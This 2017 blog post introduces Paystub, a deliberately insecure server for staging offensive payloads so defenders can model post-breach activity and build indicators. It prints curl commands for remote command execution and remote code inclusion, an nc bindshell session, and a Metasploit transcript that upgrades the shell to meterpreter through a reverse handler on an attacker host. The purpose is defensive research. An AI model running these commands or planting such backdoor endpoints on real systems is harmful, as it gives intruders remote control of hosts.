---
layout: post
date: 2017-02-04
title: "Paystub - A Playground for Post-Entry Maneuver"
description: "Part 1 - paystub-sinatra"
category: post-entry
tags: [paystub,post-exploit,cnd,ioc,i&amp;w]
excerpt_separator: <!--more-->
---
{% include JB/setup %}

Modeling and simulation are useful techniques for studying security, especially
when there's an absence of quality data. This is a fairly straightforward
exercise when considering the recon/attack phases of an intrusion: just fire
up your favorite scanner and tune for the desired effect. However, things are
not so straightforward when considering 'right-of-bang' activity. How does one
model adversary activity once the breach has occurred? Can we do better than
"just use the computer but be a bad guy"? How can we frame and focus the picture
to simplify the task of developing high-quality indicators and warnings?

<!--more-->

Rather than waiting on something bad to happen, a defender can create quality
indicators and warnings by modeling adversary COAs using the actual toolkits
where possible. Some up-front investment in an automation-friendly API allows
for rapid experimentation and precise measurement of recall and generalizability
of the derived models. Adopting this approach reduces the marginal costs for
supporting new toolchains.

So to support that task, let me introduce Paystub - a dead simple server-side
application for stubbing and running offensive payloads. The payloads could be
a RAT, meterpreter, some custom injection content, or anything else you'd like
to study in isolation. Once you have something to run, paystub exposes the
following standard endpoints:

* oneshot: invoke a shell command via GET/POST parameter
* upload: upload a file to a writable local directory via PUT
* rfi: read and eval ruby from a local or remote URI
* bindshell: fork/exec a shell with stdin/out/error bound to a network socket

Deployment options are pretty limited right now:

* local install: [git clone](https://github.com/ryanbreed/paystub-sinatra); bundle install
* remote install: [ansible playbook](https://github.com/ryanbreed/paystub-playbooks)

## Usage Examples

Seriously, you do not want to use this. It contains nothing but bad ideas.

### oneshot command execution

    curl "http://doomed:8000/oneshot?cmd=id"

    curl "http://doomed:8000/oneshot?cmd=aWQK&encode=base64"

    curl -XPOST -d 'cmd=aWQK&encode=base64' http://doomed:8000/oneshot

#### file upload via PUT

    cat $(which id) | curl -XPUT --data-binary @- "http://doomed:8000/upload/id.bin"

#### remote file inclusion

    curl "http://doomed:8000/rfi?url=http://remote-server/path/to/code.rb"

#### fork a bindshell

    curl "http://doomed:8000/bindshell?port=4455&runit=true"

    echo id | nc doomed 4455

    echo 'exit!' | nc doomed 4455

#### upgrade bindshell to meterpreter
    curl "http://doomed:8000/bindshell?port=4455&runit=true"

    ./msfconsole
    use payload/multi/handler
    set PAYLOAD ruby/shell_bind_tcp
    set RHOST doomed
    set LPORT 4455
    exploit

    [*] Started bind handler
    [*] Starting the payload handler...
    [*] Command shell session 1 opened ...
    ^Z

    Background session 1? [y/N]  y
    msf exploit(handler) > sessions -u 1
    [*] Executing 'post/multi/manage/shell_to_meterpreter' on session(s): [1]

    [*] Upgrading session ID: 1
    [*] Starting exploit/multi/handler
    [*] Started reverse TCP handler on attacker:4433
    [*] Starting the payload handler...
    [*] Transmitting intermediate stager for over-sized stage...(105 bytes)
    [*] Sending stage (1495599 bytes) to doomed
    [*] Command stager progress: 100.00% (668/668 bytes)
    [*] Meterpreter session 2 opened
    msf exploit(handler) >


##### Future Work
* [paystub-flask](https://github.com/ryanbreed/paystub-flask)
* paystub-php
